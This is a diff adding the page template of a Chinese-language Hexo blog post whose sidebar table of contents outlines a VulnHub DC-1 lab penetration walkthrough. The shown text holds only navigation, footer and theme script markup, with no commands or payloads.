+    <strong>本文作者： </strong>highgerms <i class="ic i-at"><em>@</em></i>又是美好的一天呀！
+  </li>
+  <li class="link">
+    <strong>本文链接：</strong>
+    <a href="http://example.com/2023/03/12/VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91/" title="VulnHub靶机渗透之DC:1 【DC系列】">http://example.com/2023/03/12/VulnHub靶机渗透之DC-1-【DC系列】/</a>
+  </li>
+  <li class="license">
+    <strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+  </footer>
+
+</article>
+
+  </div>
+  
+
+<div class="post-nav">
+    <div class="item left">
+      
+
+  <a href="/2023/03/12/test/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva3.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1giclfb3vzhj20zk0m8wny.jpg" title="test">
+  <span class="type">上一篇</span>
+  <span class="category"><i class="ic i-flag"></i> </span>
+  <h3>test</h3>
+  </a>
+
+    </div>
+    <div class="item right">
+    </div>
+</div>
+
+  
+  <div class="wrap" id="comments"></div>
+
+
+        </div>
+        <div id="sidebar">
+          
+
+<div class="inner">
+
+  <div class="panels">
+    <div class="inner">
+      <div class="contents panel pjax" data-title="文章目录">
+          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#vulnhub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8Bdc1-dc%E7%B3%BB%E5%88%97"><span class="toc-number">1.</span> <span class="toc-text"> VulnHub 靶机渗透之 DC:1 【DC 系列】</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%91%E7%8E%B0%E4%B8%BB%E6%9C%BA-%E9%9D%B6%E6%9C%BAip192168124130"><span class="toc-number">1.0.1.</span> <span class="toc-text"> 发现主机  ---&gt; 靶机 ip：192.168.124.130</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%AB%E6%8F%8F%E9%9D%B6%E6%9C%BA%E5%BC%80%E6%94%BE%E7%AB%AF%E5%8F%A3-22-80-111-54150"><span class="toc-number">1.0.2.</span> <span class="toc-text"> 扫描靶机开放端口 -》22、80、111、54150</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%AB%E6%8F%8F%E9%9D%B6%E6%9C%BA%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-linux-3x"><span class="toc-number">1.0.3.</span> <span class="toc-text"> 扫描靶机操作系统 -》Linux 3.X</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nmap%E8%BF%9B%E8%A1%8C%E5%AE%8C%E6%95%B4%E5%85%A8%E9%9D%A2%E7%9A%84%E6%89%AB%E6%8F%8F"><span class="toc-number">1.0.4.</span> <span class="toc-text"> nmap 进行完整全面的扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%B9%E7%BD%91%E7%AB%99%E8%BF%9B%E8%A1%8C%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB%E5%8F%91%E7%8E%B0%E6%98%AF%E4%B8%AAdrupal-7%E7%9A%84cms"><span class="toc-number">1.0.5.</span> <span class="toc-text"> 对网站进行指纹识别：发现是个 Drupal 7 的 cms</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%B9%E7%BD%91%E7%AB%99%E8%BF%9B%E8%A1%8C%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F"><span class="toc-number">1.0.6.</span> <span class="toc-text"> 对网站进行目录扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#msf%E4%BD%BF%E7%94%A8drupal%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E7%AA%81%E7%A0%B4"><span class="toc-number">1.0.7.</span> <span class="toc-text"> MSF 使用 Drupal 框架漏洞突破</span></a></li></ol></li></ol></li></ol>
+      </div>
+      <div class="related panel pjax" data-title="系列文章">
+      </div>
+      <div class="overview panel" data-title="站点概览">
+        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <img class="image" itemprop="image" alt="highgerms"
+      data-src="/images/avatar.jpg">
+  <p class="name" itemprop="name">highgerms</p>
+  <div class="description" itemprop="description"></div>
+</div>
+
+<nav class="state">
+    <div class="item posts">
+      <a href="/archives/">
+        <span class="count">3</span>
+        <span class="name">文章</span>
+      </a>
+    </div>
+    <div class="item tags">
+      <a href="/tags/">
+        <span class="count">1</span>
+        <span class="name">标签</span>
+      </a>
+    </div>
+</nav>
+
+<div class="social">
+</div>
+
+<ul class="menu">
+  
+    
+  <li class="item">
+    <a href="/" rel="section"><i class="ic i-home"></i>首页</a>
+  </li>
+
+
+</ul>
+
+      </div>
+    </div>
+  </div>
+
+  <ul id="quick">
+    <li class="prev pjax">
+    </li>
+    <li class="up"><i class="ic i-arrow-up"></i></li>
+    <li class="down"><i class="ic i-arrow-down"></i></li>
+    <li class="next pjax">
+    </li>
+    <li class="percent"></li>
+  </ul>
+</div>
+
+
+        </div>
+        <div class="dimmer"></div>
+      </div>
+    </main>
+    <footer id="footer">
+      <div class="inner">
+        <div class="widgets">
+          
+<div class="rpost pjax">
+  <h2>随机文章</h2>
+  <ul>
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2023/03/12/VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91/" title="VulnHub靶机渗透之DC:1 【DC系列】">VulnHub靶机渗透之DC:1 【DC系列】</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2023/03/12/test/" title="test">test</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2023/03/11/hello-world/" title="Hello World">Hello World</a></span>
+  </li>
+
+  </ul>
+</div>
+<div>
+  <h2>最新评论</h2>
+  <ul class="leancloud-recent-comment"></ul>
+</div>
+
+        </div>
+        <div class="status">
+  <div class="copyright">
+    
+    &copy; 2010 – 
+    <span itemprop="copyrightYear">2023</span>
+    <span class="with-love">
+      <i class="ic i-sakura rotate"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">highgerms @ highgerms's blog</span>
+  </div>
+  <div class="powered-by">
+    基于 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
+  </div>
+</div>
+
+      </div>
+    </footer>
+  </div>
+<script data-config type="text/javascript">
+  var LOCAL = {
+    path: '2023/03/12/VulnHub靶机渗透之DC-1-【DC系列】/',
+    favicon: {
+      show: "（●´3｀●）やれやれだぜ",
+      hide: "(´Д｀)大変だ！"
+    },
+    search : {
+      placeholder: "文章搜索",
+      empty: "关于 「 ${query} 」，什么也没搜到",
+      stats: "${time} ms 内找到 ${hits} 条结果"
+    },
+    valine: true,fancybox: true,
+    copyright: '复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',
+    ignores : [
+      function(uri) {
+        return uri.includes('#');
+      },
+      function(uri) {
+        return new RegExp(LOCAL.path+"$").test(uri);
+      }
+    ]
+  };
+</script>
+
+<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>
+
+<script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>
+
+<script src="/js/app.js?v=0.2.5"></script>
+
+
+
+
+</body>
+</html>
